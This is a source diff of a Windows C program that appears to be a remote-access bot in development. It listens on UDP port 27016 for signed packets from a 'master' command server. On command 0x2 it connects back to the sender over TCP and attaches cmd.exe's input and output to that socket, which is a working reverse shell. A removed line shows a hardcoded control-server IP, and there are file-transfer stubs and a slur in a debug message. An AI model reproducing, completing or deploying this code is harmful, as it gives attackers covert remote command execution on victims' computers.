@@ -73,22 +73,24 @@ int InitSetup(void)
     return 0;
 }
 
-int IpSetupINIT(struct addrinfo** ad_info)
+int IpSetupINIT(struct addrinfo* _ad_info, char* ip)
 {
     /* Slave -> Master relation ship */
     struct addrinfo hints;
     int iResult;
     ZeroMemory( &hints, sizeof(hints) );
+    struct addrinfo ad_info;
     hints.ai_family = AF_UNSPEC;
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
 
     // Resolve the server address and port
-    iResult = getaddrinfo("45.143.93.119", DEFAULT_PORT, &hints, ad_info);
+    iResult = getaddrinfo(ip, DEFAULT_PORT, &hints, &ad_info);
     if ( iResult != 0 ) {
         printf("getaddrinfo failed with error: %d\n", iResult);
         return -5;
     }
+    *_ad_info = ad_info;
     return 0;
 }
 
@@ -197,8 +199,6 @@ int TransferFile(char* path, SOCKET ConnectSocket)
     return 0;
 }
 
-
-
 int HeartBeat(SOCKET s){
     /* Slave -> Master relationship*/
     int iResult;
@@ -241,7 +241,7 @@ int WriteInPipe(HANDLE hStdinWr, OVERLAPPED* writeOverlapped,  SOCKET sock){
     return 0;
 }
 
-int SetupServerTCP(SOCKET* sock, SOCKET* ListenSocket){
+int SetupServerTCP(SOCKET* ListenSocket){
     int iResult;
     struct addrinfo *ad_info = NULL;
 
@@ -257,67 +257,93 @@ int SetupServerTCP(SOCKET* sock, SOCKET* ListenSocket){
         return 1;
     }
     *ListenSocket = socket(ad_info->ai_family, ad_info->ai_socktype, ad_info->ai_protocol);
-    if (ListenSocket == INVALID_SOCKET) {
+    if (*ListenSocket == INVALID_SOCKET) {
         DBGLG("socket failed with error: \n", WSAGetLastError());
         freeaddrinfo(ad_info);
         WSACleanup();
         return 1;
     }
-    iResult = bind( ListenSocket, ad_info->ai_addr, (int)ad_info->ai_addrlen);
+    iResult = bind( *ListenSocket, ad_info->ai_addr, (int)ad_info->ai_addrlen);
     if (iResult == SOCKET_ERROR) {
         DBGLG("bind failed with error: \n", WSAGetLastError());
         freeaddrinfo(ad_info);
-        closesocket(ListenSocket);
+        closesocket(*ListenSocket);
         WSACleanup();
         return 1;
     }
     freeaddrinfo(ad_info);
 
-    iResult = listen(ListenSocket, SOMAXCONN);
+    iResult = listen(*ListenSocket, SOMAXCONN);
     if (iResult == SOCKET_ERROR) {
         DBGLG("listen failed with error: \n", WSAGetLastError());
-        closesocket(ListenSocket);
+        closesocket(*ListenSocket);
         WSACleanup();
         return 1;
     }
+    return 0;
+}
+
+int SetupServerUDP(SOCKET* _socku){
+    struct sockaddr_in local;
+    SOCKET socku = INVALID_SOCKET;
+    *_socku = socku;
+    int iResult;
+    local.sin_family = AF_INET;
+    local.sin_addr.s_addr = INADDR_ANY;
+    local.sin_port = htons(27016);
+    socku = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    printf("%d", WSAGetLastError());
+    if (socku == INVALID_SOCKET){
+        perror("failed creating socket");
+        return 1;
+
+    }
+    printf("%d", WSAGetLastError());
+    iResult = bind(socku, (struct sockaddr *)&local, sizeof(local));
+    if (iResult < 0){
+        perror("failed to bind a socket");
+        return 2;
+        // TODO HANDLE INVALID PORT BIND
+    }
+    printf("%d", WSAGetLastError());
+    *_socku = socku;
+    return 0;
 }
 
 int __cdecl main(int argc, char **argv)
 {
     int iResult, sig;
+    iResult = InitSetup();
+    if (iResult < 0){
+        return 1;
+    }
     SOCKET ListenSocket = INVALID_SOCKET;
     SOCKET sock = INVALID_SOCKET;
-    SetupServerTCP(&sock, &ListenSocket);
-
-    /* TODO: Start a thread for heartbeating [IpSetup, Connect, HeartBeat, Close]*/
+    SOCKET socku = INVALID_SOCKET;
+    struct sockaddr_in ad_info;
+    iResult = SetupServerUDP(&socku);
+    if (iResult > 0){
+        perror("udpsetup failed");
+        return 1;
+    }
+    /* TODO: Start a thread for heartbeating [UDPIpSetup, Connect, HeartBeat, Close]*/
     while (1){
         // MAIN EVENT LOOP
         eventloop:
-        char buf[2] = {0,0};
+        char buf[1024];
         DBGLG("Listening\n");
-        sock = accept(ListenSocket, NULL, NULL);
-        DBGLG("Connected\n");
-        if (sock == INVALID_SOCKET) {
-            DBGLG("accept failed with error: \n", WSAGetLastError());
-            closesocket(ListenSocket);
-            WSACleanup();
-            return 1;
-        }
-        if (sock < 0)
-        {
-            perror("accept failed");
-            goto eventloop;
-        }
-        iResult = recv(sock, (char*)&buf, 2, 0);
-        if (iResult != 2){
-            perror("Incorrect signature recieved dropping connection");
-            closesocket(sock);
+        struct sockaddr_in ccServer;
+        int ccServerSize = sizeof(ccServer);
+        iResult = recvfrom(socku, (char*)&buf, 1024, 0, (struct sockaddr *)&ccServer, &ccServerSize);
+        if (iResult < 0){
+            perror("Packet did something wonky");
+            printf("%d", WSAGetLastError());
+            exit(1);
             goto eventloop;
         }
         sig = MatchSig(buf);
         if (sig < 0){
             perror("Invalid signature dropping connection");
-            closesocket(sock);
             goto eventloop;
         }
         switch (sig){
@@ -330,7 +356,14 @@ int __cdecl main(int argc, char **argv)
             /* File transfer, presumably uploading to client */
                 break;
             case 0x2:
+            /* Individual command output master -> (cmd) ->slave -> (output) -> master*/
                 DBGLG("Got 2 starting shell\n");
+                struct addrinfo* tcp_inf;
+                iResult = IpSetupINIT(&tcp_inf, inet_ntoa(ccServer.sin_addr));
+                iResult = Connect(&sock, &tcp_inf);
+                if (iResult < 0){
+                    perror("failed at connecting");
+                }
                 HANDLE hStdinRd, hStdinWr, hStdoutRd, hStdoutWr;
                 SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
 
@@ -341,11 +374,7 @@ int __cdecl main(int argc, char **argv)
                     perror("failed at creating pipes for child process");
                     break;
                 }
-
-                // Set the bInheritHandle flag so the child process inherits the handles.
                 sa.bInheritHandle = TRUE;
-
-                // Create the child process.
                 STARTUPINFO si = { sizeof(STARTUPINFO) };
                 PROCESS_INFORMATION pi;
                 si.dwFlags = STARTF_USESTDHANDLES;
@@ -359,14 +388,11 @@ int __cdecl main(int argc, char **argv)
                 if (!CreateProcess(NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
                 {
                     perror("failed at creating process");
+                    closesocket(sock);
                     break;
                 }
-
-                // Close the write ends of the pipes in the parent process.
                 CloseHandle(hStdoutWr);
                 CloseHandle(hStdinRd);
-
-                // Read from the output pipe and write to the input pipe.
                 /* INITIAL CMD LOADING*/
                 ScanOutPipe(hStdoutRd, &readOverlapped, sock);
                 ScanOutPipe(hStdoutRd, &readOverlapped, sock);
@@ -381,14 +407,12 @@ int __cdecl main(int argc, char **argv)
                         break;
                     }
                 }
-                // Close the read end of the output pipe.
                 CloseHandle(hStdoutRd);
                 CloseHandle(hStdinWr);
-                TerminateProcess(pi.hProcess, 0);
-                // clean up
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
-            /* Individual command output master -> (cmd) ->slave -> (output) -> master*/
+                TerminateProcess(pi.hProcess, 0);
+                closesocket(sock);
                 break;
             case 0x3:
                 DBGLG("Got 3\n");
@@ -401,7 +425,6 @@ int __cdecl main(int argc, char **argv)
             default:
                 DBGLG("Got retarded data\n");
         }
-        closesocket(sock);
     }
 
     WSACleanup();
